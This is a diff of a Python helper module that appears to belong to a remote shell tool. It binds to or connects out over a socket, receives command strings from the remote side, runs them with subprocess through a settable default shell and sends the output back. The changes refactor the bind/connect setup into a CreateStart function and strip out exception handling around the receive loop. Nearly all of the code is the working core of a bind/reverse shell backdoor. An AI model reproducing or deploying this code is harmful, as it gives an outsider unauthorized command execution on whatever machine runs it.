@@ -3,6 +3,7 @@ import S
 import F
 import subprocess
 import time as Time
+import CS
 
 def Bind(Socket, Ip, Port):
     try:
@@ -28,66 +29,27 @@ def CheckAndPrint(Message):
         print(Message)
 
 
-def GetAndExecute(Socket):
-    while Message != S.ServerEndCommand:
-        CommandOutput = S.VoidString
-        Message = S.VoidString
-        F.CheckAndPrint(S.OutputSplitter)
 
-        try:
-            F.CheckAndPrint(S.CommandWaitingMSG)
-            Message = F.RecvAndDecode(Socket, S.Frame)
-            #Message = ClientSocket.recv(Frame).decode()
-            F.CheckAndPrint(Message)
+        
 
-            if Message == S.VoidString:
-                F.CheckAndPrint(S.RefusedConnectionMSG)
-                return S.ErrorCode
-        except:
-            F.CheckAndPrint(S.RecvErrorMSG)
-            return S.ErrorCode
+def CreateStart(BC):
 
-        if Message == S.SetDefaultShellCommand:
-            F.SendAndEncode(Socket, S.SetDefaultShellCommandMSG)
-            DefaultShell = F.RecvAndDecode(Socket, S.Frame) 
+    Socket = SocketLib.socket(S.IpV, S.Protocol)
 
-            if DefaultShell == S.RemoveDefaultShell:
-                DefaultShell = S.VoidString
-                F.CheckAndPrint(S.RemovedDefaultShellMSG)
-                ShellCommandSplitter = S.NDefaultShellCommandSplitter
-                F.SendAndEncode(Socket, S.RemovedDefaultShellMSG)
-
-            else:
-                ShellCommandSplitter = S.YDefaultShellCommandSplitter # " "
-                F.SendAndEncode(Socket, S.DefaultShellMSG + S.SpaceSplitChar + DefaultShell)
-
-        else:
-            Command = DefaultShell + ShellCommandSplitter + Message
-
-            try:
-                F.CheckAndPrint(Command)
-                CommandOutput = str(subprocess.run(Command, stdout=subprocess.PIPE))
-                F.CheckAndPrint(CommandOutput)
-
-            except:
-                F.SendAndEncode(Socket, S.ShellErrorMSG)
-
-            F.SendAndEncode(Socket, CommandOutput)
-            F.CheckAndPrint(S.OutputSplitter)
-
-def CheckMode_BLC(Socket):
-
-    if S.Mode == S.ClientToServerMode:
+    if BC == S.BindCode:
 
         if Socket.bind((S.AcceptingIp, S.ServerPort)) == S.ErrorCode:
-            return S.ErrorCodeTrue
+            return S.ErrorCode
         Socket.listen(S.ServerQueue)
         ClientSocket, ClientInfo = Socket.accept()
         F.CheckAndPrint(S.AcceptMSG) 
-        return [ClientSocket, ClientInfo]
+        F.CheckAndPrint(ClientInfo)
+        return Socket, ClientSocket
 
-    elif S.Mode == S.ServerToClientMode:
-        F.ConnectionLoop(Socket, S.ClientIp, S.ClientPort)
+    elif BC == S.ConnectCode:
+        
+        F.ConnectionLoop(Socket, S.ServerIp, S.ServerPort)
+        return Socket
 
         
 def ConnectionLoop(Socket, Ip, Port):
@@ -134,18 +96,20 @@ def GetAndExecute(ServerSocket, ClientSocket):
         Message = S.VoidString
         F.CheckAndPrint(S.OutputSplitter)
 
-        try:
-            F.CheckAndPrint(S.CommandWaitingMSG)
-            Message = F.RecvAndDecode(ClientSocket, S.Frame)
-            #Message = ClientSocket.recv(Frame).decode()
-            F.CheckAndPrint(Message)
 
-            if Message == S.VoidString:
-                F.CheckAndPrint(S.RefusedConnectionMSG)
-                return S.ErrorCode
-        except:
-            F.CheckAndPrint(S.RecvErrorMSG)
+        F.CheckAndPrint(S.CommandWaitingMSG)
+        Message = F.RecvAndDecode(ClientSocket, S.Frame)
+        #Message = ClientSocket.recv(Frame).decode()
+        F.CheckAndPrint(Message)
+
+        if Message == S.VoidString:
+            F.CheckAndPrint(S.RefusedConnectionMSG)
             return S.ErrorCode
+        
+
+
+        #F.CheckAndPrint(S.RecvErrorMSG)
+        #return S.ErrorCode
 
         if Message == S.SetDefaultShellCommand:
             F.SendAndEncode(ClientSocket, S.SetDefaultShellCommandMSG)
